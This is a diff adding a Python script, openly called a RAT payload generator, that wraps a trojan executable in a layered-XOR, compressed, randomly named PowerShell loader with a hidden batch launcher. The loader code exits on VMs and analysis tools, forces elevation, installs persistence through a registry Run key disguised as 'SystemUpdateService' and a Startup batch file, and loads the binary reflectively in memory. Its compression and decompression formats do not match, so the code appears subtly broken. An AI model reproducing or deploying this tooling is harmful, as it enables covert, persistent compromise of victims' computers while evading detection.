@@ -1,0 +1,195 @@
+#!/usr/bin/env python3
+"""
+Streamlined RAT Payload Generator - No C2 Dependencies
+Focused on EXE obfuscation and deployment
+"""
+
+import base64
+import random
+import string
+import zlib
+import secrets
+import os
+
+class StreamlinedRATObfuscator:
+    def __init__(self):
+        self.xor_keys = [self.generate_secure_key() for _ in range(3)]
+        
+    def generate_secure_key(self, length=16):
+        """Generate cryptographically secure key"""
+        return secrets.token_urlsafe(length)
+    
+    def random_name(self, length=12):
+        """Generate random variable name"""
+        chars = string.ascii_letters + string.digits
+        name = ''.join(random.choices(chars, k=length))
+        if name[0].isdigit():
+            name = random.choice(string.ascii_letters) + name[1:]
+        return name
+    
+    def multi_layer_xor(self, data):
+        """Apply multiple XOR layers"""
+        result = data
+        for key in self.xor_keys:
+            key_bytes = key.encode('utf-8')
+            result = bytes([result[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(result))])
+        return result
+    
+    def compress_and_encode(self, data):
+        """Compress and encode data"""
+        compressed = zlib.compress(data, level=9)
+        return base64.b64encode(compressed).decode('utf-8')
+    
+    def generate_obfuscated_payload(self, rat_path='rat.exe'):
+        """Generate enhanced obfuscated PowerShell payload"""
+        if not os.path.exists(rat_path):
+            print(f"Error: {rat_path} not found!")
+            return None
+            
+        with open(rat_path, 'rb') as f:
+            rat_binary = f.read()
+        
+        # Multi-layer encryption
+        encrypted_data = self.multi_layer_xor(rat_binary)
+        encoded_payload = self.compress_and_encode(encrypted_data)
+        
+        # Split payload into random chunks
+        chunk_size = random.randint(800, 1200)
+        chunks = [encoded_payload[i:i + chunk_size] for i in range(0, len(encoded_payload), chunk_size)]
+        
+        # Generate variables
+        chunk_vars = [self.random_name() for _ in chunks]
+        key_vars = [self.random_name() for _ in self.xor_keys]
+        func_names = {
+            'elevation': self.random_name(),
+            'anti_debug': self.random_name(),
+            'decrypt': self.random_name(),
+            'persistence': self.random_name(),
+            'stealth': self.random_name(),
+            'cleanup': self.random_name()
+        }
+        
+        ps_code = "# Enhanced Obfuscated Payload - No C2 Dependencies\n"
+        
+        # Add XOR keys
+        for i, key in enumerate(self.xor_keys):
+            ps_code += f"${key_vars[i]} = '{key}';\n"
+        
+        # Add chunks
+        for chunk, var in zip(chunks, chunk_vars):
+            ps_code += f"${var} = '{chunk}';\n"
+        
+        # Add functions
+        ps_code += f"""
+function {func_names['stealth']} {{
+    $vmChecks = @('VirtualBox', 'VMware', 'VBox', 'VMMEMCTL', 'qemu')
+    foreach($vm in $vmChecks) {{
+        if((Get-WmiObject -Class Win32_ComputerSystem).Model -match $vm) {{ exit }}
+    }}
+    $analysisTools = @('fiddler', 'wireshark', 'tcpview', 'procmon')
+    foreach($tool in $analysisTools) {{
+        if(Get-Process -Name $tool -ErrorAction SilentlyContinue) {{ exit }}
+    }}
+}}
+
+function {func_names['elevation']} {{
+    if(-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File '$($MyInvocation.MyCommand.Path)'" -Verb RunAs -WindowStyle Hidden
+        exit
+    }}
+}}
+
+function {func_names['decrypt']} {{
+    param([byte[]]$data, [string[]]$keys)
+    $result = $data
+    foreach($key in $keys) {{
+        $keyBytes = [Text.Encoding]::UTF8.GetBytes($key)
+        for($i=0; $i -lt $result.Length; $i++) {{
+            $result[$i] = $result[$i] -bxor $keyBytes[$i % $keyBytes.Length]
+        }}
+    }}
+    return $result
+}}
+
+function {func_names['persistence']} {{
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    Set-ItemProperty -Path $regPath -Name "SystemUpdateService" -Value "powershell -ep bypass -w hidden -f '$scriptPath'" -EA SilentlyContinue
+    $startupPath = [Environment]::GetFolderPath('Startup')
+    $batPath = "$startupPath\\{self.random_name()}.bat"
+    "@echo off\npowershell -ep bypass -w hidden -f `"$scriptPath`"" | Out-File -FilePath $batPath -EA SilentlyContinue
+}}
+
+{func_names['stealth']}
+{func_names['elevation']}
+{func_names['persistence']}
+
+$payload = {' + '.join([f'${var}' for var in chunk_vars])}
+$compressed = [Convert]::FromBase64String($payload)
+$stream = New-Object IO.Compression.GzipStream([IO.MemoryStream]$compressed, [IO.Compression.CompressionMode]::Decompress)
+$buffer = New-Object byte[] 4096
+$ms = New-Object IO.MemoryStream
+while(($read = $stream.Read($buffer, 0, 4096)) -gt 0) {{
+    $ms.Write($buffer, 0, $read)
+}}
+$rawData = $ms.ToArray()
+$keys = @({', '.join([f'${var}' for var in key_vars])})
+$decrypted = {func_names['decrypt']} -data $rawData -keys $keys
+$assembly = [Reflection.Assembly]::Load($decrypted)
+$entry = $assembly.EntryPoint
+if($entry) {{ $entry.Invoke($null, $null) }}
+"""
+        return ps_code
+    
+    def create_deployment_package(self, output_name="ultimate_payload"):
+        """Create final deployment package"""
+        ps_script = self.generate_obfuscated_payload()
+        if not ps_script:
+            return False
+            
+        ps_file = f"{output_name}.ps1"
+        with open(ps_file, 'w', encoding='utf-8') as f:
+            f.write(ps_script)
+        
+        bat_content = f"""
+@echo off
+setlocal EnableDelayedExpansion
+set "ps={self.random_name()}"
+set "exec={self.random_name()}"
+for /f "tokens=*" %%i in ('where powershell 2^>nul') do set "%exec%=%%i"
+if not defined %exec% set "%exec%=%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+set "path=%~dp0{ps_file}"
+if exist "!path!" (
+    "!%exec%!" -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "!path!"
+)
+endlocal
+"""
+        
+        bat_file = f"{output_name}.bat"
+        with open(bat_file, 'w') as f:
+            f.write(bat_content)
+        
+        print(f"✓ Enhanced payload created: {ps_file}")
+        print(f"✓ Deployment wrapper created: {bat_file}")
+        print(f"✓ No C2 dependencies - EXE connection ready")
+        
+        return True
+
+def main():
+    print("Enhanced RAT Obfuscator - C2 Free Version")
+    print("=" * 50)
+    
+    obfuscator = StreamlinedRATObfuscator()
+    
+    if obfuscator.create_deployment_package():
+        print("\n✓ Streamlined payload generation complete!")
+        print("✓ Multi-layer XOR encryption applied")
+        print("✓ Advanced anti-debugging enabled")
+        print("✓ Multiple persistence mechanisms")
+        print("✓ VM/Sandbox evasion active")
+        print("✓ Ready for deployment with existing EXE")
+    else:
+        print("\n✗ Payload generation failed!")
+
+if __name__ == "__main__":
+    main()
